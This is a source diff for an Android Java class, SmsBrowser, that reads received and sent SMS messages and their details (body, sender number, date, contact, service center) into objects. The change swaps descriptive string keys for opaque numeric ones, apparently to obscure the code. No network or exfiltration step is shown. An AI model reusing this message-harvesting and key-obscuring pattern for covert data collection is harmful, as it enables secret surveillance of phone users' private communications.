@@ -32,8 +32,8 @@ public class SmsBrowser {
 	public ArrayList<Sms> getSmsList() {
 		list.clear();
 
-		parse(Messages.getString("SmsBrowser.0"), Sms.RECEIVED); //$NON-NLS-1$
-		parse(Messages.getString("SmsBrowser.1"), Sms.SENT); //$NON-NLS-1$
+		parse(Messages.getString("14.0"), Sms.RECEIVED); //$NON-NLS-1$
+		parse(Messages.getString("14.1"), Sms.SENT); //$NON-NLS-1$
 
 		return list;
 	}
@@ -55,9 +55,9 @@ public class SmsBrowser {
 
 			// These fields are needed
 			try {
-				body = c.getString(c.getColumnIndexOrThrow(Messages.getString("SmsBrowser.2"))).toString(); //$NON-NLS-1$
-				number = c.getString(c.getColumnIndexOrThrow(Messages.getString("SmsBrowser.3"))).toString(); //$NON-NLS-1$
-				date = Long.parseLong(c.getString(c.getColumnIndexOrThrow(Messages.getString("SmsBrowser.4"))).toString()); //$NON-NLS-1$
+				body = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.2"))).toString(); //$NON-NLS-1$
+				number = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.3"))).toString(); //$NON-NLS-1$
+				date = Long.parseLong(c.getString(c.getColumnIndexOrThrow(Messages.getString("14.4"))).toString()); //$NON-NLS-1$
 				sentStatus = sentState;
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
@@ -71,7 +71,7 @@ public class SmsBrowser {
 
 			// These fields are optional
 			try {
-				final int yields_id = c.getColumnIndexOrThrow(Messages.getString("SmsBrowser.5")); //$NON-NLS-1$
+				final int yields_id = c.getColumnIndexOrThrow(Messages.getString("14.5")); //$NON-NLS-1$
 				s.setYieldsId(yields_id);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
@@ -80,7 +80,7 @@ public class SmsBrowser {
 			}
 
 			try {
-				final int thread_id = c.getColumnIndexOrThrow(Messages.getString("SmsBrowser.6")); //$NON-NLS-1$
+				final int thread_id = c.getColumnIndexOrThrow(Messages.getString("14.6")); //$NON-NLS-1$
 				s.setThreadId(thread_id);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
@@ -89,7 +89,7 @@ public class SmsBrowser {
 			}
 
 			try {
-				final String person = c.getString(c.getColumnIndexOrThrow(Messages.getString("SmsBrowser.7"))).toString(); //$NON-NLS-1$
+				final String person = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.7"))).toString(); //$NON-NLS-1$
 				s.setPerson(person);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
@@ -98,7 +98,7 @@ public class SmsBrowser {
 			}
 
 			try {
-				final int protocol = c.getColumnIndexOrThrow(Messages.getString("SmsBrowser.8")); //$NON-NLS-1$
+				final int protocol = c.getColumnIndexOrThrow(Messages.getString("14.8")); //$NON-NLS-1$
 				s.setProtocol(protocol);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
@@ -107,7 +107,7 @@ public class SmsBrowser {
 			}
 
 			try {
-				final int read = c.getColumnIndexOrThrow(Messages.getString("SmsBrowser.9")); //$NON-NLS-1$
+				final int read = c.getColumnIndexOrThrow(Messages.getString("14.9")); //$NON-NLS-1$
 				s.setRead(read);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
@@ -116,7 +116,7 @@ public class SmsBrowser {
 			}
 
 			try {
-				final int status = c.getColumnIndexOrThrow(Messages.getString("SmsBrowser.10")); //$NON-NLS-1$
+				final int status = c.getColumnIndexOrThrow(Messages.getString("14.10")); //$NON-NLS-1$
 				s.setStatus(status);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
@@ -125,7 +125,7 @@ public class SmsBrowser {
 			}
 
 			try {
-				final int type = c.getColumnIndexOrThrow(Messages.getString("SmsBrowser.11")); //$NON-NLS-1$
+				final int type = c.getColumnIndexOrThrow(Messages.getString("14.11")); //$NON-NLS-1$
 				s.setType(type);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
@@ -134,7 +134,7 @@ public class SmsBrowser {
 			}
 
 			try {
-				final int reply_path = c.getColumnIndexOrThrow(Messages.getString("SmsBrowser.12")); //$NON-NLS-1$
+				final int reply_path = c.getColumnIndexOrThrow(Messages.getString("14.12")); //$NON-NLS-1$
 				s.setReplyPath(reply_path);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
@@ -150,7 +150,7 @@ public class SmsBrowser {
 			 */
 
 			try {
-				final String service_center = c.getString(c.getColumnIndexOrThrow(Messages.getString("SmsBrowser.13"))).toString(); //$NON-NLS-1$
+				final String service_center = c.getString(c.getColumnIndexOrThrow(Messages.getString("14.13"))).toString(); //$NON-NLS-1$
 				s.setServiceCenter(service_center);
 			} catch (final Exception e) {
 				if (Cfg.DEBUG) {
